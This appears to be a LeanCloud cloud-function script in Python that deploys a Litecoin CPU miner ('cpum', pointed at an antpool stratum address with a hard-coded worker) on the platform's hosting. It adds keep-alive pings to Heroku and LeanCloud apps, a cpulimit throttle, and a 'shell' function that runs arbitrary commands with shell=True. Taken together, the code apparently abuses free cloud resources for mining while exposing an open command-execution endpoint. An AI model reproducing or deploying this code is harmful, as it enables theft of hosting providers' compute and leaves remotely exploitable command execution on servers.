# coding: utf-8
import subprocess
import select

from leancloud import Engine
from leancloud import LeanEngineError

import requests
import time

import psutil

engine = Engine()


#minerd.exe --url (YOUR STRATUM POOL ADDRESS) -a scrypt --userpass (YOUR WORKER USERNAME):(YOUR PASSWORD)
#str_cmd = 'PATH="$PATH:/home/azhu/test" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
str_setup = 'chmod +x cpum'
str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && cpum --url=stratum+tcp://stratum-ltc.antpool.com:443 --user=waylite --algo=scrypt --userpass waylite.1:x'
#str_cmd = 'PATH="$PATH:/home/leanengine/app" && echo $PATH && ls -l'
ENGNIE_RESTARTED = True

@engine.define( 'cpuinfo' )
def cpu_info():
	print 'psutil.pids()',psutil.pids()
	print 'psutil.cpu_count()',psutil.cpu_count()

	try:
		print 'psutil.cpu_count(logical=False)', psutil.cpu_count(logical=False)
	except:
		pass
	try:
		print 'psutil.cpu_stats()', psutil.cpu_stats()
	except:
		pass
	try:
		print 'psutil.cpu_freq()', psutil.cpu_freq()
	except:
		pass
	try:
		print 'psutil.cpu_percent()', psutil.cpu_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times_percent()', psutil.cpu_times_percent()
	except:
		pass
	try:
		print 'psutil.cpu_times()', psutil.cpu_times()
	except:
		pass
	try:
		print 'psutil.cpu_times(percpu=True)', psutil.cpu_times(percpu=True)
	except:
		pass
	try:
		print 'psutil.cpu_times().user', psutil.cpu_times().user
	except:
		pass




@engine.define( 'shell' )
# 调试 {'cmd':'ls -l' }
def OutputShell( cmd, **params ):
	print 'shell:',cmd
	result = subprocess.Popen(
		#[ "ping 127.0.0.1" ],
		#[ "find /usr" ],
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	n=0
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()      #行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg,

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
		if(n%8==0):
			print psutil.cpu_times_percent()
		n += 1

	result.wait() # 等待字进程结束( 等待shell命令结束 )
	print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode

#上传运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'setup' )
def Setup(**params):
	print str_setup
	OutputShell(str_setup)
	return True

@engine.define( 'install' )
def cmd_install(**params):
	OutputShell('apt-get install cpulimit')
	OutputShell('sudo apt-get install cpulimit')
	return True

@engine.define( 'ls' )
def ls_cmd(**params):
	OutputShell('ls -l')
	return True

@engine.define( 'sysinfo' )
def cmd_sysinfo(**params):
	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
	return True

@engine.define( 'cpulimit' )
def cmd_cpulimit(**params):
	OutputShell('cpulimit -l 40')
	return True

#半小时运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'enginerestart' )
def EngineRestart(**params):
	global ENGNIE_RESTARTED
	if(ENGNIE_RESTARTED):
		print 'EngineRestart:Once'
		ENGNIE_RESTARTED = False
		OutputShell(str_setup)
		time.sleep(2)
		OutputShell(str_cmd)
	else:
		print 'Engine Running:Pass'
	return True

#半小时运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'heart' )
def Heart(**params):
	print 'Heart',
	response = requests.get( "http://mlite01.leanapp.cn/heart" )
	print '..Heart End'
	return True

#半小时运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'herokuapp' )
def Heart_herokuapp(**params):
	print 'Heart of herokuapp',
	response = requests.get( "https://my-m001.herokuapp.com/" )
	response = requests.get( "https://my-m002.herokuapp.com/" )
	print '..Heart End'
	return True